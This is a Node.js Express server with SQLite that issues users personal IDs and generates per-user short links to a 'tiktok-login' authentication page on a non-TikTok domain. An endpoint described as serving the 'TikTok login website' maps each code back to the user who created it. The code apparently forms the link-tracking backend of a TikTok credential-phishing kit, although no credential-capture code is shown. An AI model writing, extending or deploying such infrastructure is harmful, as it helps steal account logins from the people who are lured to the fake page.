const express = require('express');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const PORT = 3001;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Database setup
const db = new sqlite3.Database('./database.db');

// Create tables
db.serialize(() => {
    db.run(`
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            personal_id TEXT UNIQUE NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    `);

    db.run(`
        CREATE TABLE IF NOT EXISTS links (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT NOT NULL,
            link TEXT NOT NULL,
            short_code TEXT UNIQUE NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users(personal_id)
        )
    `);
});

// API Routes

// 1. Generate or get existing user ID
app.post('/api/get-user-id', (req, res) => {
    const { personal_id } = req.body;
    
    if (personal_id) {
        // Check if user exists
        db.get('SELECT * FROM users WHERE personal_id = ?', [personal_id], (err, user) => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            if (user) {
                res.json({ 
                    personal_id: user.personal_id,
                    is_new: false
                });
            } else {
                const newId = uuidv4();
                db.run('INSERT INTO users (personal_id) VALUES (?)', [newId], (err) => {
                    if (err) {
                        return res.status(500).json({ error: err.message });
                    }
                    res.json({ 
                        personal_id: newId,
                        is_new: true
                    });
                });
            }
        });
    } else {
        // Generate new user ID
        const newId = uuidv4();
        db.run('INSERT INTO users (personal_id) VALUES (?)', [newId], (err) => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ 
                personal_id: newId,
                is_new: true
            });
        });
    }
});

// 2. Generate new link
app.post('/api/generate-link', (req, res) => {
    const { user_id, original_url } = req.body;
    
    if (!user_id || !original_url) {
        return res.status(400).json({ error: 'User ID and URL required' });
    }
    
    const shortCode = Math.random().toString(36).substring(2, 8);
    const generatedLink = `https://tiktok-login.example.com/auth?code=${shortCode}`;
    
    db.run(
        'INSERT INTO links (user_id, link, short_code) VALUES (?, ?, ?)',
        [user_id, original_url, shortCode],
        function(err) {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            
            res.json({
                success: true,
                generated_link: generatedLink,
                short_code: shortCode,
                link_id: this.lastID
            });
        }
    );
});

// 3. Get user's generated links
app.get('/api/user-links/:user_id', (req, res) => {
    const { user_id } = req.params;
    
    db.all(
        'SELECT * FROM links WHERE user_id = ? ORDER BY created_at DESC',
        [user_id],
        (err, links) => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ links });
        }
    );
});

// 4. Get link info by short code (for TikTok login website)
app.get('/api/link-info/:short_code', (req, res) => {
    const { short_code } = req.params;
    
    db.get(
        'SELECT l.*, u.personal_id FROM links l JOIN users u ON l.user_id = u.personal_id WHERE l.short_code = ?',
        [short_code],
        (err, link) => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            if (!link) {
                return res.status(404).json({ error: 'Link not found' });
            }
            res.json({ link });
        }
    );
});

app.listen(PORT, () => {
    console.log(`Link Generator Server running on http://localhost:${PORT}`);
});
